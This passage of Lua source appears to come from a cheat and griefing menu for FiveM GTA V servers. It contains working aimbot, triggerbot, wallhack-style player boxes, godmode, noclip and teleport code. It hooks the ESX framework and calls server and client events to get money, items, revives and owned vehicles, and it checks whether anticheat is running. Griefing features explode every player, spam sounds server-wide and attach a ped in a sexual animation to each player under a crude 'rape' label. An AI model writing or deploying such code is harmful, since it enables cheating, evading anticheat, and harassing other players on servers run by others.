                        ['Text'] = 'Back',
                        ['Type'] = 'menu',
                        ['Menu'] = 1,
                    }
                }
            end)
            Wait(0) 
        end
    end)
end

local LoadESX = function()
    if not ESX then
        local test = LoadResourceFile('es_extended', 'client/common.lua')
        if test then
            print('Found ESX... Looking for event.')
            local x, Start = string.find(test, 'AddEventHandler%(')
            local x, End = string.find(test, ',')
            if Start and End then
                local event = string.sub(test, Start + 2, End - 2)
                print('ESX event found: ^1' .. event)
                if event ~= 'esx:getSharedObject' then
                    print('^1Warning!^0 This server is most likely running an anticheat. (ESX event is not "esx:getSharedObject")')
                end
                print('Loading ESX...')

                CreateThread(function()
                    while ESX == nil do 
                        TriggerEvent(event, function(obj) 
                            ESX = obj
                            if obj then
                                print('ESX successfully loaded.')
                            end
                            Objects[11] = {
                                {
                                    ['Text'] = 'Delay',
                                    ['Type'] = 'toggle',
                                    ['Enabled'] = false,
                                    ['cb'] = ESXMenu
                                },
                                {
                                    ['Text'] = 'Get money',
                                    ['Type'] = 'toggle',
                                    ['Enabled'] = false,
                                    ['cb'] = ESXMenu
                                },
                                {
                                    ['Text'] = 'Get item',
                                    ['Type'] = 'button',
                                    ['cb'] = ESXMenu
                                },
                                {
                                    ['Text'] = 'Max thirst & hunger',
                                    ['Type'] = 'button',
                                    ['cb'] = ESXMenu
                                },
                                {
                                    ['Text'] = 'Set current vehicle as owned',
                                    ['Type'] = 'button',
                                    ['cb'] = ESXMenu
                                },
                                {
                                    ['Text'] = 'Update current vehicle information',
                                    ['Type'] = 'button',
                                    ['cb'] = ESXMenu
                                },
                                {
                                    ['Text'] = 'Cuff / uncuff (self)',
                                    ['Type'] = 'button',
                                    ['cb'] = ESXMenu 
                                },
                                {
                                    ['Text'] = 'Back',
                                    ['Type'] = 'menu',
                                    ['Menu'] = 1,
                                }
                            }
                        end)
                        Wait(0) 
                    end
                end)
            else
                print('Couldn\'t find ESX event.')
            end
        else
            print('ESX not found.')
        end
    else
        print('ESX is already loaded.')
    end
end

local SetPedFriendly = function(ped)
    SetEntityInvincible(ped, true)
    SetEntityAsMissionEntity(ped, true, true)
    SetPedHearingRange(ped, 0.0)
    SetPedSeeingRange(ped, 0.0)
    SetPedAlertness(ped, 0.0)
    SetPedFleeAttributes(ped, 0, 0)
    SetBlockingOfNonTemporaryEvents(ped, true)
    SetPedCombatAttributes(ped, 46, true)
    SetPedFleeAttributes(ped, 0, 0)
end

local MenuColor = {
    ['Background'] = {33, 33, 33, 223},
    ['Main'] = {45, 45, 45, 255},
    ['Label'] = {0, 0, 0, 255}
}

local EnableEffect = function(data)
    local current = data['Items'][data['Current']]
    Toggles['Effect'] = current
    if current == 'none' then
        SetPedConfigFlag(PlayerPedId(), 100, false)
        SetPedIsDrunk(PlayerPedId(), false)
        ResetPedMovementClipset(PlayerPedId(), 0.0)
        ShakeGameplayCam('DRUNK_SHAKE', 0.0)
        StopScreenEffect('DrugsMichaelAliensFight')
        StopScreenEffect('DrugsMichaelAliensFightIn')
        StopScreenEffect('DrugsTrevorClownsFight')
        StopScreenEffect('DrugsTrevorClownsFightIn')
        ClearExtraTimecycleModifier()
        ClearTimecycleModifier()
    end
end

local SetMenuOffsets = function(data)
    local current = data['Items'][data['Current']]
    if data['Text'] == 'Menu X offset' then
        MenuXOffset = tonumber(current)
    elseif data['Text'] == 'Menu Y offset' then
        MenuYOffset = tonumber(current) + 0.003
    end
end

local MenuPress = function(data)
    if data['Type'] == 'toggle' then
        Toggles[data['Text']] = data['Enabled']
    elseif data['Type'] == 'list' then
        if data['Text'] == 'Godmode' then
            if anticheatrunning then
                if data['Items'][data['Current']] == 'godmode' then
                    AnticheatWarning()
                else
                    Toggles['Godmode'] = data['Items'][data['Current']]
                end
            else
                Toggles['Godmode'] = data['Items'][data['Current']]
            end
        elseif data['Text'] == 'Infinite ammo' then
            if anticheatrunning then
                if data['Items'][data['Current']] == 'infinite ammo' then
                    AnticheatWarning()
                else
                    Toggles['Infinite ammo'] = data['Items'][data['Current']]
                end
            else
                Toggles['Infinite ammo'] = data['Items'][data['Current']]
            end
        elseif data['Text'] == 'Aimbot [fov]' then
            aimbotfov = tonumber(data['Items'][data['Current']])
        elseif data['Text'] == 'Aimbot [bone]' then
            aimbotbone = data['Items'][data['Current']]
        elseif data['Text'] == 'Outfit' then
            if data['Items'][data['Current']] ~= 'Random' then
                TriggerEvent('skinchanger:loadSkin', Outfits[data['Items'][data['Current']]])
            else
                SetPedComponentVariation(PlayerPedId(), 8, math.random(0, 250), 0, 2)                    
                SetPedComponentVariation(PlayerPedId(), 11, math.random(0, 250), 0, 2)                    
                SetPedComponentVariation(PlayerPedId(), 3, math.random(0, 150), 0, 2)                
                SetPedComponentVariation(PlayerPedId(), 4, math.random(0, 150), 0, 2)                    
                SetPedComponentVariation(PlayerPedId(), 6, math.random(0, 100), 0, 2)                    
                SetPedComponentVariation(PlayerPedId(), 1, math.random(0, 100), 1, 2)                        
            end
        elseif data['Text'] == 'Refill' then
            if data['Items'][data['Current']] == 'health' then
                SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
            else
                SetPedArmour(PlayerPedId(), 100)
            end
        elseif data['Text'] == 'Give weapon' then
            GiveWeaponToPed(PlayerPedId(), data['Items'][data['Current']], 250, false, false) 
        elseif data['Text'] == 'Prop everyone' then
            if not anticheatrunning then
                for k, v in pairs(allplayers) do
                    local pped = GetPlayerPed(v)
                    CreateThread(function()
                        local model = GetHashKey(props[data['Items'][data['Current']]])
                        while not HasModelLoaded(model) do
                            Wait(0)
                            RequestModel(model)
                        end
                        local obj = CreateObject(model, GetEntityCoords(pped), true, true, true)
                        table.insert(spawnedprops, obj)
                        AttachEntityToEntity(obj, pped, 11816, 0.0, -0.5, 0.0, 0.5, 0.5, 0.0, false, false, false, false, 2, false)
                    end)
                end
            else
                AnticheatWarning()
            end
        end
    elseif data['Type'] == 'button' then
        if data['Text'] == 'Suicide' then
            SetEntityHealth(PlayerPedId(), 0)
        elseif data['Text'] == 'Remove spawned props' then
            for k, v in pairs(spawnedprops) do
                CreateThread(function()
                    while DoesEntityExist(v) do
                        Wait(0)
                        DetachEntity(v, false, false)
                        while not NetworkHasControlOfEntity(v) do
                            NetworkRequestControlOfEntity(v)
                            Wait(0)
                        end
                        SetEntityAsMissionEntity(v, true, true)
                        DeleteEntity(v)
                        Wait(100)
                    end
                end)
            end
            spawnedprops = {}
        elseif data['Text'] == 'Revive' then
            local coords = GetEntityCoords(PlayerPedId())
            NetworkResurrectLocalPlayer(coords, GetEntityHeading(PlayerPedId()), true, false)
            ClearPedBloodDamage(PlayerPedId())
            TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
            StopScreenEffect('DeathFailOut')
            for i = 0, GetNumResources() - 1 do
                if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                    local text = LoadResourceFile(GetResourceByFindIndex(i), 'client/main.lua')
                    if text then
                        if string.find((text):lower(), ("RegisterNetEvent('esx_ambulancejob:revive')"):lower(), 1, true) then
                            print('Found ambulance revive, reviving..')
                            TriggerEvent('esx_ambulancejob:revive')
                        end
                    end
                end
            end
        elseif data['Text'] == 'Delete attached' then
            for k, v in pairs(GetStuff('Object')) do
                if IsEntityAttachedToEntity(v, PlayerPedId()) then
                    CreateThread(function()
                        while DoesEntityExist(v) do
                            Wait(0)
                            DetachEntity(v, false, false)
                            while not NetworkHasControlOfEntity(v) do
                                NetworkRequestControlOfEntity(v)
                                Wait(0)
                            end
                            SetEntityAsMissionEntity(v, true, true)
                            DeleteEntity(v)
                            Wait(100)
                        end
                    end)
                end
            end
        elseif data['Text'] == 'Teleport to waypoint' then
            CreateThread(function()
                local waypoint = GetFirstBlipInfoId(8)

                if DoesBlipExist(waypoint) then
                    local coords = GetBlipInfoIdCoord(waypoint).xy

                    for height = 1, 1000 do
                        SetPedCoordsKeepVehicle(PlayerPedId(), coords.x, coords.y, height + 0.0)

                        local found, height = GetGroundZFor_3dCoord(coords.x, coords.y, height + 0.0)

                        if found then
                            SetPedCoordsKeepVehicle(PlayerPedId(), coords.x, coords.y, height + 0.0)

                            break
                        end

                        Wait(0)
                    end

                end
            end)
        elseif data['Text'] == 'Teleport to coords' then
            menuvisible = false
            CreateThread(function()
                local x = tonumber(KeyboardInput('What X coordinate?', '', 30))
                if x then
                    local y = tonumber(KeyboardInput('What Y coordinate?', '', 30))
                    if y then
                        local z = tonumber(KeyboardInput('What Z coordinate?', '', 30))
                        if z then
                            SetPedCoordsKeepVehicle(PlayerPedId(), x + 0.0, y + 0.0, z + 0.0)
                            Wait(250)
                            local timer = GetGameTimer() + 5000
                            while not HasCollisionLoadedAroundEntity(PlayerPedId()) do
                                Wait(0)
                                SetPedCoordsKeepVehicle(PlayerPedId(), x + 0.0, y + 0.0, z + 0.0)
                                if timer <= GetGameTimer() then
                                    break
                                end
                            end
                        end
                    end
                end
                menuvisible = true
            end)
        elseif data['Text'] == 'Explode everyone (silent)' then
            for k, v in pairs(allplayers) do
                local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                AddExplosion(GetEntityCoords(pped), 34, 500.0, false, true, false, false)
            end
        elseif data['Text'] == 'Give all weapons' then
            for k, v in pairs(weapons) do
                GiveWeaponToPed(PlayerPedId(), GetHashKey(v), 250, false, false)
            end
        elseif data['Text'] == 'Remove all weapons' then
            RemoveAllPedWeapons(PlayerPedId())
        end
    end
end

CreateThread(function()
    while true do
        local me = PlayerPedId()
        for k, v in pairs(Toggles) do
            if k == 'Invisible' then
                SetEntityVisible(me, not v, false)
            elseif k == 'Godmode' then
                if v == 'off' then
                    SetEntityInvincible(me, false)
                    SetPlayerInvincible(PlayerId(), false)
                    SetEntityProofs(me, false, false, false, false, false, false, false, false)
                    SetEntityCanBeDamaged(me, true)
                elseif v == 'godmode' then
                    if not anticheatrunning then
                        SetEntityInvincible(me, true)
                        SetPlayerInvincible(PlayerId(), true)
                        SetEntityProofs(me, true, true, true, true, true, true, true, true)
                        SetEntityCanBeDamaged(me, false)
                    else
                        AnticheatWarning()
                    end
                elseif v == 'safe' then
                    SetEntityInvincible(me, false)
                    SetPlayerInvincible(PlayerId(), false)
                    SetEntityProofs(me, false, false, false, false, false, false, false, false)
                    SetEntityCanBeDamaged(me, true)
                    if GetEntityHealth(me) < GetEntityMaxHealth(me) - 25 then
                        SetTimeout(250, function()
                            SetEntityHealth(me, GetEntityMaxHealth(me))
                        end)
                    end
                    if IsPedDeadOrDying(me) or IsPedFatallyInjured(me) then
                        Wait(2500)
                        local coords = GetEntityCoords(me)
                        NetworkResurrectLocalPlayer(coords, GetEntityHeading(me), true, false)
                        ClearPedBloodDamage(me)
                        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
                        StopScreenEffect('DeathFailOut')
                    end
                end
            elseif k == 'Max fuel' then
                if v then
                    local vehicle = GetVehiclePedIsUsing(me)
                    if vehicle then
                        if DoesEntityExist(vehicle) then
                            if GetVehicleFuelLevel(vehicle) <= 50.0 then
                                SetVehicleFuelLevel(vehicle, math.random(7500, 10000) / 100)
                            end
                        end
                    end
                end
            elseif k == 'Crosshair' then
                if v then
                    DrawRect(0.5, 0.5, 0.0045, 0.001, table.unpack(RGB(0.1)))
                    DrawRect(0.5, 0.5, 0.001, 0.008, table.unpack(RGB(0.1)))
                end
            elseif k == 'PlayerBlips' then
                if v then

                    if math.random(1500) == 42 then -- update the blips every once in a while, since people join / leave the server. 
                        print('Reloading blips')
                        for k, v in pairs(playerblips) do
                            RemoveBlip(v)
                        end
                    
                        for k, v in pairs(GetActivePlayers()) do
                            local pped = GetPlayerPed(v)
                            playerblips[v] = AddBlipForCoord(GetEntityCoords(pped))
                            SetBlipAsShortRange(blip, true)
                
                            BeginTextCommandSetBlipName('STRING')
                            AddTextComponentString(GetPlayerName(v) .. ' | ' .. GetPlayerServerId(v))
                            EndTextCommandSetBlipName(playerblips[v])
                        end
                    end

                    for k, v in pairs(playerblips) do
                        local pped = GetPlayerPed(k)
                        if pped then
                            if DoesEntityExist(pped) then
                                if friends[GetPlayerServerId(k)] then
                                    SetBlipColour(v, 2)
                                else
                                    SetBlipColour(v, 0)
                                end
                                SetBlipCoords(v, GetEntityCoords(pped))
                            end
                        end
                    end
                end
            elseif k == 'Noclip' then
                if v then
                    local x, y, z = table.unpack(GetEntityCoords(me, true))

                    local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(PlayerPedId())
                    local pitch = GetGameplayCamRelativePitch()
                    
                    local dx = -math.sin(heading * math.pi / 180.0)
                    local dy = math.cos(heading * math.pi / 180.0)
                    local dz = math.sin(pitch * math.pi / 180.0)
                    
                    local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                    if len ~= 0 then
                        dx = dx/len
                        dy = dy/len
                        dz = dz/len
                    end
                                    
                    local speed = 2.0
                
                    SetEntityVelocity(me, 0.0001, 0.0001, 0.0001)

                    if IsControlPressed(0, 21) then
                        speed = speed + 10
                    end

                    if IsControlPressed(0, 19) then
                        speed = 0.5
                    end

                    if IsControlPressed(0, 32) then
                        x = x + speed * dx
                        y = y + speed * dy
                        z = z + speed * dz
                    end
                
                    if IsControlPressed(0, 269) then
                        x = x - speed * dx
                        y = y - speed * dy
                        z = z - speed * dz
                    end
                    SetEntityCoordsNoOffset(me, x, y, z, true, true, true)
                end
            elseif k == 'Infinite stamina' then
                if v then
                    ResetPlayerStamina(PlayerId())
                end
            elseif k == 'No ragdoll' then
                if v then
                    if not anticheatrunning then
                        SetPedCanBeKnockedOffVehicle(me, false)	
                        SetPedCanRagdoll(me, false)
                        SetPedCanRagdollFromPlayerImpact(me, false)
                        SetPedRagdollOnCollision(me, false)
                        SetPedCanBeDraggedOut(me, false)
                    else
                        Toggles[k] = false
                        AnticheatWarning()
                    end
                else
                    SetPedCanRagdoll(me, true)
                end
            elseif k == 'Shrink ped' then
                if v then
                    if not anticheatrunning then
                        if not GetPedConfigFlag(me, 223, false) then
                            SetPedConfigFlag(me, 223, true)
                        end
                    else
                        Toggles[k] = false
                        AnticheatWarning()
                    end
                else
                    if GetPedConfigFlag(me, 223, true) then
                        SetPedConfigFlag(me, 223, false)
                    end
                end
            elseif k == 'Super run' then
                if v then
                    if anticheatrunning then
                        Toggles[k] = false
                        AnticheatWarning()
                    else
                        ResetPlayerStamina(PlayerId())
                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                        SetPedMoveRateOverride(me, 5.0)
                    end
                else
                    SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                    SetPedMoveRateOverride(me, 1.0)
                end
            elseif k == 'Super jump' then
                if v then
                    if anticheatrunning then
                        Toggles[k] = false
                        AnticheatWarning()
                    else
                        SetSuperJumpThisFrame(PlayerId())
                    end
                end
            elseif k == 'Radar' then
                DisplayRadar(v)
            elseif k == 'Effect' then
                if v == 'drunk' then
                    SetPedConfigFlag(me, 100, true)
                    SetPedIsDrunk(me, true)
                    while not HasAnimSetLoaded('MOVE_M@DRUNK@VERYDRUNK') do
                        RequestAnimSet('MOVE_M@DRUNK@VERYDRUNK')
                        Wait(0)
                    end
                    ShakeGameplayCam('DRUNK_SHAKE', 1.0)
                    SetPedMovementClipset(me, 'MOVE_M@DRUNK@VERYDRUNK', 1)
                    SetExtraTimecycleModifier('spectator5')
                    SetTimecycleModifier('Drunk')
                    SetPedMotionBlur(me, true)
                elseif v == 'high' then
                    SetPedConfigFlag(me, 100, true)
                    SetPedIsDrunk(me, true)
                    while not HasAnimSetLoaded('MOVE_M@DRUNK@VERYDRUNK') do
                        RequestAnimSet('MOVE_M@DRUNK@VERYDRUNK')
                        Wait(0)
                    end
                    ShakeGameplayCam('DRUNK_SHAKE', 1.0)
                    SetPedMovementClipset(me, 'MOVE_M@DRUNK@VERYDRUNK', 1)
                    SetTimecycleModifier('Drunk')
                    SetTimecycleModifierStrength(1.0)
                    StartScreenEffect('DrugsMichaelAliensFight', 50000, 1)
                    StartScreenEffect('DrugsMichaelAliensFightIn', 50000, 1)
                    StartScreenEffect('DrugsTrevorClownsFight', 50000, 1)
                    StartScreenEffect('DrugsTrevorClownsFightIn', 50000, 1)
                end
            elseif k == 'Rape all players' then
                if v then
                    for k, v in pairs(allplayers) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        if not anticheatrunning then
                            if not peds[GetPlayerServerId(v)] then
                                local model = GetHashKey('a_m_m_acult_01')
                                while not HasModelLoaded(model) do
                                    Wait(0)
                                    RequestModel(model)
                                end
                        
                                local ped = CreatePed(5, model, GetEntityCoords(pped), GetEntityHeading(pped), true, true)
                                peds[GetPlayerServerId(v)] = ped
                                CreateThread(function()
                                    SetPedDefaultComponentVariation(ped)
                                    SetPedFriendly(ped)
                                    AttachEntityToEntity(ped, pped, 11816, 0.0, -0.5, 0.0, 0.5, 0.5, 0.0, false, false, false, false, 2, false)
                            
                                    while true do
                                        if not IsEntityPlayingAnim(ped, 'rcmpaparazzo_2', 'shag_loop_a', 3) then
                                            while not HasAnimDictLoaded('rcmpaparazzo_2') do 
                                                Wait(0) 
                                                RequestAnimDict('rcmpaparazzo_2') 
                                            end
                                            TaskPlayAnim(ped, 'rcmpaparazzo_2', 'shag_loop_a', 8.0, -8.0, -1, 1, 0, false, false, false)
                                        end
                                        Wait(0)
                                    end
                                end)
                            end
                        else
                            Toggles[k] = false
                            AnticheatWarning()
                        end
                    end
                else
                    for k, v in pairs(peds) do
                        if v then
                            CreateThread(function()
                                while DoesEntityExist(v) do
                                    Wait(0)
                                    while not NetworkHasControlOfEntity(v) do
                                        NetworkRequestControlOfEntity(v)
                                        Wait(0)
                                    end
                                    SetEntityAsMissionEntity(v, true, true)
                                    DeleteEntity(v)
                                    peds[k] = nil
                                end
                            end)
                        end
                    end
                end
            elseif k == 'Explode everyone' then
                if v then
                    for k, v in pairs(allplayers) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        AddExplosion(GetEntityCoords(pped), 34, 500.0, true, false, false, false)
                    end
                end
            elseif k == 'Give server cancer' then
                if v then
                    for k, v in pairs(allplayers) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        local particles = {
                            {'scr_indep_fireworks', 'scr_indep_firework_starburst'},
                            {'scr_indep_fireworks', 'scr_indep_firework_shotburst'},
                            {'proj_xmas_firework', 'scr_firework_xmas_spiral_burst_rgw'},
                        }
                        for k, v in pairs(particles) do
                            while not HasNamedPtfxAssetLoaded(v[1]) do 
                                Wait(0) 
                                RequestNamedPtfxAsset(v[1])
                            end
                            UseParticleFxAssetNextCall(v[1])
                            StartNetworkedParticleFxNonLoopedAtCoord(v[2], GetEntityCoords(pped) + vec3(0.0, 0.0, 15.0), 0.0, 180.0, 0.0, 20.0, false, false, false, false)
                        end
    
                        AddExplosion(GetEntityCoords(pped), 34, 500.0, true, false, 0.0)

                        local model = GetHashKey('dump')
                        while not HasModelLoaded(model) do 
                            RequestModel(model)
                            Wait(0)
                        end
                        CreateVehicle(model, GetEntityCoords(pped), GetEntityHeading(pped), true, true)

                        if HasInteractSound and servereventdelay < GetGameTimer() then
                            servereventdelay = GetGameTimer() + 2500
                            TriggerServerEvent('InteractSound_SV:PlayOnAll', interactsoundaudios[math.random(1, #interactsoundaudios)], 1.0)
                        end
                    end
                end
            elseif k == 'Interactsound spammer' then
                if v then
                    if HasInteractSound and servereventdelay < GetGameTimer() then
                        servereventdelay = GetGameTimer() + 2500
                        local randomsound = interactsoundaudios[math.random(1, #interactsoundaudios)]
                        TriggerServerEvent('InteractSound_SV:PlayOnAll', randomsound, 1.0)
                    end
                end
            elseif k == 'Explosive hands' then
                if v then
                    if IsDisabledControlJustReleased(0, 24) and GetSelectedPedWeapon(PlayerPedId()) == -1569615261 then
                        local _, _, _, _, ped = GetRaycastResult(Cast_3dRayPointToPoint(GetEntityCoords(me), GetOffsetFromEntityInWorldCoords(me, 0.0, 1.3, 0.0), 1.0, 12, me, 7))
                        
                        if ped ~= 0 then
                            if ped ~= me then
                                SetTimeout(450, function()
                                    AddExplosion(GetEntityCoords(ped), 34, 100000.0, true, false, 0.0)
                                end)
                            end
                        else
                            SetTimeout(450, function()
                                AddExplosion(GetPedBoneCoords(me, 57005, vec3(0.0, 0.0, 0.0)), 34, 100000.0, true, false, 0.0)
                            end)
                        end
                    end
                end
            elseif k == 'Explosive ammo' then
                if v then
                    local x, coords = GetPedLastWeaponImpactCoord(me)
                    if x and IsPedArmed(me, 6) then
                        AddExplosion(coords, 34, 100000.0, true, false, 0.0)
                    end
                end
            elseif k == 'Firework ammo' then
                if v then
                    local x, coords = GetPedLastWeaponImpactCoord(me)
                    if x then

                        local particles = {
                            {'proj_indep_firework', 'scr_indep_launcher_sparkle_spawn'},
                            {'proj_indep_firework_v2', 'scr_xmas_firework_burst_fizzle'},
                            {'proj_indep_firework_v2', 'scr_firework_indep_burst_rwb'},
                            {'proj_xmas_firework', 'scr_firework_xmas_ring_burst_rgw'},
                        }
                        for k, v in pairs(particles) do
                            while not HasNamedPtfxAssetLoaded(v[1]) do 
                                Wait(0) 
                                RequestNamedPtfxAsset(v[1])
                            end
                            UseParticleFxAssetNextCall(v[1])
                            StartNetworkedParticleFxNonLoopedAtCoord(v[2], coords + vec3(0.0, 0.0, 3.5), 0.0, 180.0, 0.0, 20.0, false, false, false, false)
                        end

                    end
                end
            elseif k == 'Teleport to bullet' then
                if v then
                    local x, coords = GetPedLastWeaponImpactCoord(me)
                    if x then
                        SetTimeout(100, function()
                            SetEntityCoords(me, coords)
                        end)
                    end
                end
            elseif k == 'Show coords' then
                if v then
                    local coords = GetEntityCoords(me)
                    local heading = GetEntityHeading(me)
                    DrawTxt(('~m~X: ~s~%s ~m~Y: ~s~%s ~m~Z: ~s~%s ~m~H: ~s~%s'):format(string.format('%.2f', coords.x), string.format('%.2f', coords.y), string.format('%.2f', coords.z), string.format('%.2f', heading)), 0.0, true, nil, 0.35, 0.5, true, 0.1)
                end
            elseif k == 'Infinite ammo' then
                if v == 'off' then
                    SetPedInfiniteAmmoClip(me, false)
                    for k, weapon in pairs(weapons) do
                        SetPedInfiniteAmmo(me, false, GetHashKey(weapon))
                    end
                elseif v == 'safe' then
                    SetPedInfiniteAmmoClip(me, false)
                    for k, weapon in pairs(weapons) do
                        SetPedInfiniteAmmo(me, false, GetHashKey(weapon))
                    end
                    if GetAmmoInPedWeapon(me, GetSelectedPedWeapon(me)) < 15 then
                        local x, max = GetMaxAmmo(me, GetSelectedPedWeapon(me))
                        AddAmmoToPed(me, GetSelectedPedWeapon(me), max)
                    end
                elseif v == 'infinite ammo' then
                    SetPedInfiniteAmmoClip(me, true)
                    for k, weapon in pairs(weapons) do
                        SetPedInfiniteAmmo(me, true, GetHashKey(weapon))
                    end
                end
            elseif k == 'Player boxes' then
                if v then
                    for k, v in pairs(GetActivePlayers()) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        if pped ~= me then
                            if HasEntityClearLosToEntity(PlayerPedId(), pped, 17) then
                                local color = RGB(0.3)
                                if IsPedDeadOrDying(pped) then
                                    color = {215, 0, 15, 255}
                                end
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, -0.9), GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, -0.9), table.unpack(color))

                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, 0.8), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, 0.8), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, 0.8), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, 0.8), table.unpack(color))

                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, 0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, -0.3, -0.3, -0.9), table.unpack(color))
                                DrawLine(GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, 0.8), GetOffsetFromEntityInWorldCoords(pped, 0.3, -0.3, -0.9), table.unpack(color))
                            else
                                local wh = 1.85 / GetDistanceBetweenCoords(GetEntityCoords(me), GetEntityCoords(pped), true)
                                SetDrawOrigin(GetEntityCoords(pped))	
                                local rgb = RGB(0.3)
                                if IsPedDeadOrDying(pped) then
                                    rgb = {215, 0, 15}
                                end
                                DrawRect(0.0, 0.0, wh/3, wh, rgb[1], rgb[2], rgb[3], 55)
                                ClearDrawOrigin()
                            end
                        end
                    end
                end
            elseif k == 'Player lines' then
                if v then
                    for k, v in pairs(GetActivePlayers()) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        local rgb = RGB(0.3)
                        if IsPedDeadOrDying(pped) then
                            rgb = {215, 0, 15, 255}
                        end
                        DrawLine(GetEntityCoords(me), GetEntityCoords(pped), table.unpack(rgb))
                    end
                end
            elseif k == 'Player names' then
                if v then
                    for k, v in pairs(GetActivePlayers()) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        if pped ~= me then
                            SetDrawOrigin(GetPedBoneCoords(pped, bones['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4))
                            DrawTxt(GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')', 0.0, false, {255, 255, 255, 255}, 0.35, 0.0, true, 0.3)
                            ClearDrawOrigin()

                            SetDrawOrigin(GetPedBoneCoords(pped, bones['pelvis'], 0, 0, 0))
                            if IsPedDeadOrDying(pped) then
                                if not GetEntityCanBeDamaged(pped) or GetPlayerInvincible(v) then
                                    DrawTxt('Dead | Godmode', 0.0, false, {255, 255, 255, 255}, 0.2, 0.0, true, 0.3)
                                else
                                    DrawTxt('Dead', 0.0, false, {255, 255, 255, 255}, 0.2, 0.0, true, 0.3)
                                end
                            else
                                if not GetEntityCanBeDamaged(pped) or GetPlayerInvincible(v) then
                                    DrawTxt('Godmode', 0.0, false, {255, 255, 255, 255}, 0.2, 0.0, true, 0.3)
                                end
                            end
                            ClearDrawOrigin()
                        end
                    end
                end
            elseif k == 'Aimbot' then
                if v then
                    if IsDisabledControlPressed(0, 24) and IsPedArmed(me, 6) then

                        for k, v in pairs(allplayers) do
                            local pped = GetPlayerPed(v)

                            if pped ~= me then
                                if DoesEntityExist(pped) and not IsPedDeadOrDying(pped) then
                                    if IsEntityVisible(pped) and HasEntityClearLosToEntity(me, pped, 17) then
                                        if IsEntityOnScreen(pped) then
                                            for k, v in pairs(bones) do
                                                local onscreen, x, y = GetScreenCoordFromWorldCoord(table.unpack(GetPedBoneCoords(pped, v, 0, 0, 0)))
                                                local dist = math.abs(0.5 - x) + math.abs(0.5 - y)
                                                if dist <= aimbotfov then
                                                    if bones[aimbotbone] then
                                                        ShootAtCoord(GetPedBoneCoords(pped, bones[aimbotbone], 0, 0, 0))
                                                    else
                                                        ShootAtCoord(GetPedBoneCoords(pped, GetBoneAimingAt(pped), 0, 0, 0))
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end

                    end
                end
            elseif k == 'Super handling' then
                local vehicle = GetVehiclePedIsUsing(me)
                if vehicle then
                    if DoesEntityExist(vehicle) then
                        if v then
                            SetVehicleGravityAmount(vehicle, 20.0)
                        else
                            SetVehicleGravityAmount(vehicle, 10.0)
                        end
                    end
                end
            elseif k == 'Triggerbot' then
                if v then
                    
                    local exists, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if exists then

                        for k, v in pairs(allplayers) do
                            local pped = GetPlayerPed(v)

                            if pped ~= me and pped == entity then
                                if DoesEntityExist(pped) and not IsPedDeadOrDying(pped) then
                                    if IsEntityVisible(pped) then
                                        for k, v in pairs(bones) do
                                            ShootAtCoord(GetPedBoneCoords(pped, GetBoneAimingAt(pped), 0, 0, 0))
                                        end
                                    end
                                end
                            end
                        end

                    end

                end
            elseif k == 'Show aimbot fov' then
                if v then
                    DrawRect(0.5, 0.5, aimbotfov, aimbotfov * 1.78, 45, 45, 45, 75)
                end
            elseif k == 'Spinbot' then
                if v then
                    if not (IsControlPressed(0, 32) or IsControlPressed(0, 33) or IsControlPressed(0, 34) or IsControlPressed(0, 35) or IsPedInAnyVehicle(me, false)) then
                        SetEntityHeading(me, GetEntityHeading(me) + 15)
                    end
                end
            elseif k == 'Neon RGB' then
                if v then
                    local vehicle = GetVehiclePedIsUsing(me)
                    if vehicle then
                        SetVehicleNeonLightsColour(vehicle, table.unpack(RGB(0.2)))
                    end
                end
